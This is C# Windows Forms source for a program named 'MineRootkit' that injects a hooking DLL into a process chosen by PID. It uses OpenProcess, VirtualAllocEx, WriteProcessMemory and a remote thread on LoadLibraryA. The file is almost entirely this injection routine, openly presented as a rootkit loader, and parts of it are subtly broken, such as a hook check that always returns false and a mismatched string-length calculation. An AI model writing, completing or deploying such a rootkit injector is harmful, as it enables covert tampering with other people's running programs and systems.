using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace MineRootkit
{
    public partial class Main : Form
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(long Access, bool Inherit, int PID);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr Handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lib);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr Module, string Function);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr ProcHandle, IntPtr BaseAddress, string Buffer, int size, int NumOfBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr ProcessHandle, [In, Optional] IntPtr Address, int Size, uint AllocationType, uint Protection);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr ProcessHandle, IntPtr ThreadAttributes, uint StackSize, IntPtr StartAddress, IntPtr Parameter, uint CreationFlags, [Out] uint ThreadID);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr Handle, uint TimeInMilli);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFreeEx(IntPtr ProcessHandle, IntPtr Address, int Size, uint FreeType);

        public Main()
        {
            InitializeComponent();
        }

        private unsafe bool IsLoadLibraryAHooked()
        {
            return false;
        }

        public static unsafe int strlen(string s)
        {
            int length = 0;
            fixed (char* pStr = s)
            {
                length = *(((int*)pStr) - 1);
            }
            return length;
        }

        private unsafe bool InjectHookingLibrary(string DllPath, int PID)
        {
            IntPtr ProcessToInjectDllInto = OpenProcess(0x000F0000L | 0x00100000L | 0xFFFF, false, PID);
            if(ProcessToInjectDllInto != IntPtr.Zero)
            {
                IntPtr LoadLibraryA = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr Allocation = VirtualAllocEx(ProcessToInjectDllInto, IntPtr.Zero, strlen(DllPath), 0x00001000 | 0x00002000, 0x04);
                WriteProcessMemory(ProcessToInjectDllInto, Allocation, DllPath, strlen(DllPath), 0);
                IntPtr RemoteThread = CreateRemoteThread(ProcessToInjectDllInto, IntPtr.Zero, 0, LoadLibraryA, Allocation, 0, 0);
                WaitForSingleObject(RemoteThread, 0xFFFFFFF);
                VirtualFreeEx(ProcessToInjectDllInto, Allocation, strlen(DllPath), 0x00008000);
                CloseHandle(RemoteThread);
                CloseHandle(ProcessToInjectDllInto);
                return true;
            }
            return false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                MessageBox.Show("Please Enter Process PID.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
            }
            else
            {
                if (InjectHookingLibrary(Environment.CurrentDirectory + @"\MineRootkitHooking.dll", Convert.ToInt32(textBox1.Text)))
                {
                    MessageBox.Show("Successfully Injected The Hooking Library.", "Success", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("Error While Injecting The Hooking Dll.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void Main_Load(object sender, EventArgs e)
        {

        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
    }
}